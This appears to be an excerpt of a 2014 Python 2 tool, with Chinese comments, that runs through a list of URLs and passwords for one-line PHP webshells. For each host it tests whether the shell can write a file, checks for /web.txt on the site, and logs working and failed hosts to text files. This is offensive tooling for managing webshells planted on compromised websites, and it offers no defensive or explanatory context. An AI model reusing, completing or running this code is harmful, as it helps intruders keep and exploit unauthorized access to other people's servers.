...
class C_Queue(threading.Thread):
    ...
    def URL_TQURL2(self,data): #URL提取URL
        try:  #127.0.0.1:8888
            data +="/"      #data ="https://www.baidu.com/cache/sethelp/index.html"
            if ~data.find("http://"):  #~取反
                data=data[7:] #字符串删除
        ...
        try:
            while True:
                ...
                if self.yjH.yijuhua_cs(ASP_PHP,self.URL[0],self.URL[1]): #ASP还是PHP  ,URL地址 ，密码
                    ...
                    if self.yjH.yijuhua_php_web_file(self.URL[0],self.URL[1]):  #测试是否有上传权限
                        #print self.URL_TQURL2(self.URL[0])
                        url=self.URL[0]
                        url_data=self.yjH.open_url_read("http://"+self.URL_TQURL2(url)+"/web.txt")
                        if url_data:
                            if self.yjH.URL_DZ(url_data,r'long'):
                                data=self.URL[0]+"|"+self.URL[1]+"|"+"http://"+self.URL_TQURL2(url)+"/web.txt"+"|"+LIN_WIN32+"|"+WLWZ
                                self.TXT_file("web_add_file_ok.txt",str(data))
                                print u"web_add_file_ok.txt OK连接成功-写入成功  访问文件成功----",data
                            else:
                                data=self.URL[0]+"|"+self.URL[1]+"|"+"http://"+self.URL_TQURL2(url)+"/web.txt"+"|"+LIN_WIN32+"|"+WLWZ
                                self.TXT_file("web_add_file_ok_1.txt",str(data))
                                print u"web_add_file_ok_1.txt OK连接成功-写入成功  文件比对失败----",data
                        else:
                            data=self.URL[0]+"|"+self.URL[1]+"|"+LIN_WIN32+"|"+WLWZ
                            self.TXT_file("web_add_file_ok_2.txt",str(data))
                            print u"web_add_file_ok_2.txt OK连接成功-写入成功  访问文件失败----",data

                    else:
                        data=self.URL[0]+"|"+self.URL[1]+"|"+LIN_WIN32+"|"+WLWZ
                        self.TXT_file("web_add_file_no.txt",str(data))
                        print u"web_add_file_no.txt OK连接成功-写入文件失败----",data
...
if __name__ == "__main__":
    print u"一句话测试上传权限  目前只支持PHP版本   BY:29295842@qq.com      2014.7.29"
    print u"web_add_file_ok.txt   OK连接成功-写入成功  访问文件成功----"
    print u"web_add_file_ok_1.txt   OK连接成功-写入成功  文件比对失败----"
    print u"web_add_file_ok_2.txt   OK连接成功-写入成功  访问文件失败----"
    print u"web_add_file_no.txt   OK连接成功-写入文件失败----"
    print u"NO.txt   连接失败-失败可能原因----"
...
#    yjH=eval_php.C_YJH()
#    print yjH.yijuhua_php_web_file("http://127.0.0.1:8888/long.php","long") #ASP还是PHP  ,URL地址 ，密码
